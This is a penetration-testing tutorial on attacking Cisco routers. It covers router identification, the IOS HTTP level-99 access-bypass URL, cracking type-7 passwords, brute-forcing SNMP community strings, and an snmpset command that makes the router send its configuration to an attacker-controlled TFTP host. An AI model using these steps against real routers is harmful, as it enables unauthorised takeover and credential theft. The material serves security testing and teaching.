Source: https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=1a827b4b-931a-4643-932c-e2765039aa58&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments

Full control of the routing device can often lead to full control of the network - 
  either by using credentials learned from the router on other network devices and systems, 
  or by acting more deviously and diverting some traffic through a third-party system on its way to the intended destination.
  
---------------------------
---------------------------
---------------------------
Identifying a Router

Routers can be configured to look just like any other system on the network - 
  they can run a web server, an SSH daemon, chargen, and they can even appear to be running multiple X servers. 
  For this reason, they can may often be mistaken as Unix systems.


Easiest and most accurate way of identifying a host on the network as a router is by using Nmap:

A port scan of a typical Cisco router might look like this:
 Interesting ports on router1: 
 (The 168 ports scanned but not shown below are in state: closed) 
 Port       State       Service 
 7/tcp      open        echo 
 9/tcp      open        discard 
 13/tcp     open        daytime 
 19/tcp     open        chargen 
 23/tcp     open        telnet 
 79/tcp     open        finger 
 2001/tcp   open        dc 
 4001/tcp   open        unknown 
 6001/tcp   open        X11:1 
 9001/tcp   open        unknown 
 Remote operating system guess: Cisco Router/Switch with IOS 11.2
 
 If a login service such as telnet or SSH is accessible,
 one can simply use a standard telnet client and connect to the appropriate port. 
 
 A basic Cisco router might look like the following:
telnet router1 Trying router1... Connected to router1. Escape character is '^]'. User Access Verification Password: 

The "User Access Verification" line is a trademark Cisco telnet banner. 
Of course one can't rely on banners alone, since system administrators sometimes modify them for deceptive reasons.


SING is a tool that one can use to assemble custom ICMP packets, to include ICMP netmask requests (ICMP type 17). 
In my experience, routers are typically the only devices that reply to this type of ICMP packet. 
Sending this type (and others) of ICMP packet may also help to positively identify a system as a router.
https://freshmeat.net/redir/sing/9570/url_tgz/SING-current.tar.gz

Using traceroute to find the organization's border router is also quite easy. 
Once the target site's Internet accessible systems have been identified, 
one can traceroute to those systems to learn the pathway to them. T
ypically the last hop before an Internet accessible system is the organization's border router.

Other methods exist, but typically a Telnet client or NetCat is all one needs to connect and verify the device is a router.

---------------------------
---------------------------
---------------------------
Identifying Vulnerabilities

A vuln scanner can have a list of about 44 community strings to brute-force the SNMP daemon, 
which maybe enough to catch the usage of common default community strings such as public, and private, 
but of course can't take into account site-specific strings that might be in use.

---------------------------
---------------------------
---------------------------
Exploiting Vulnerabilities in Cisco IOS

A vulnerability that affects most Cisco routers (when conditions are right) 
is the HTTP Configuration Arbitrary Administrative Access Vulnerability. 

1) fire up web browser and point it to the vulnerable router.
A pop up will ask for your user name and password.

2) After clicking the "Cancel" button, 
  the pen tester enters the following URL into the address bar. http://10.0.1.252/level/99/exec/show/config 
  and is presented with the startup configuration of the device.
  
Clearly visible in the web browser is the configuration of the target router.

In it, we see exactly how the router is configured,
        other interfaces, 
        the Access Control Lists (ACLS) if any, 
        the SNMP community strings, 
        and the easily decrypted passwords!
        
Of the three different methods in IOS of storing the password, 
the network administrator has chosen Vigenere - 
an easily reversed encryption scheme. 
In this case, I fire up the freely available tool GetPass from Boson and instantly reverse the hash into plain text.

Once the password is cracked, the pen tester logs in via telnet and gains complete administrative control on the router.

As mentioned, there are three methods IOS can use to represent a password in a router config file. They are:
Clear Text. ----------------- enable password password
Vigenere    ----------------- enable password 7 104B0718071B17
MD5         ----------------- enable secret 5 $1$yOMG$38ZIcsEmMaIjsCyQM6hya0

It should be obvious that the most secure option is the one-way hash MD5, which by its very nature, cannot be reversed. 
It's implemented using the command, "enable secret 0 password".


---------------------------
---------------------------
---------------------------
Exploiting Configuration Errors

Brute-Forcing Services: SNMP is Always Fun

A basic port scan may reveal that UDP port 161 (SNMP) is open and accessible. 
If the SNMP community strings are dictionary words, the pen tester is in luck.

You can use free SNMP audit scanner ADMsnmp --> http://www.freshports.org/security/ADMsnmp/
    ADMsnmp is a console-based application that will mow through a wordlist pretty quickly, 
    letting you know of any community strings it guesses

When determining the wordlist to use, 
I typically surf the target website and attempt to learn as much about the target as possible. 
I then take a bunch of acronyms, names, and departments, and try those words. 

Linux ships with a wordfile (/usr/share/dict/words) that contains 45427 words.
 
 
The "send setrequest" string lets the user know that he has gained Read/Write privileges on the device. 

The first thing I usually do after gaining this level of access is to briefly walk to MIB (Management Information Base) 
to learn more about the device.
 (in this example: recv snmpd paket id = 140 name = duckling ret = 0 <<<<<<<<<< ) 
 
 snmpwalk -v 1 -c duckling 10.0.1.252 | head SNMPv2-MIB::sysDescr.0 = STRING: Cisco Internetwork Operating System Software  IOS (tm) 2500 Software (C2500-I-L), Version 12.0(14), RELEASE SOFTWARE (fc1) Copyright (c) 1986-2000 by cisco Systems, Inc. Compiled Tue 31-Oct-00 23:59 by linda SNMPv2-MIB::sysObjectID.0 = OID: SNMPv2-SMI::enterprises.9.1.30 SNMPv2-MIB::sysUpTime.0 = Timeticks: (103607424) 11 days, 23:47:54.24 SNMPv2-MIB::sysContact.0 = STRING:  SNMPv2-MIB::sysName.0 = STRING: ADMsnmp SNMPv2-MIB::sysLocation.0 = STRING:  SNMPv2-MIB::sysServices.0 = INTEGER: 6 
 
 Once I learn the device is a router, and running Cisco's IOS, 
 I will then have the router send its config file to one of my systems using TFTP. 
 I do this with the following command:

snmpset 10.0.1.252 duckling  .1.3.6.1.4.1.9.2.1.55.192.168.1.15 s "config" enterprises.9.2.1.55.192.168.1.15 = "config" 

I'll then check my tftpboot directory, and sure enough, the router's config file is now on my system. 

---------------------------
---------------------------
---------------------------
Brute-Forcing Login Services

Brute-forcing login services such as Telnet and SSH.

One of the first things to do before conducting this type of attack on the router is to determine whether 
or not the router is using some type of extended authentication like Tacacs or Radius. 

hough IOS doesn't have any means of natively locking out users after X number of login attempts, 
lockouts can be enabled when authentication is passed off to another system via Tacacs or Radius. 

The easiest way to tell if authentication is being passed to another system is to simply connect to the router 
using a standard Telnet client.

 [root@hackyou root]# telnet router2 
 Trying router2... Connected to router2. Escape character is '^]'. User Access Verification Username:
 
 
 If the device prompts for a username, you can almost be sure that it is using some form of extended authentication.
 
 In this case, Tacacs is implemented and brute-forcing is going to be more difficult,
 because the pen tester will have to guess two variables, both the username and password instead of just the password.

 
  If finger is running, usernames can be gathered,  but the chances of locking out a legitimate user account will 
  likely stop most pen testers from conducting this sort of an attack.
 
 If it is determined that extended authorization is not in use, 
 then the pen tester can brute-force the Telnet daemon in much the same way he did with SNMP.
  - Windows brute-force tool: Brutus
  - THC's Hydra is also good, unix-based tool.
  
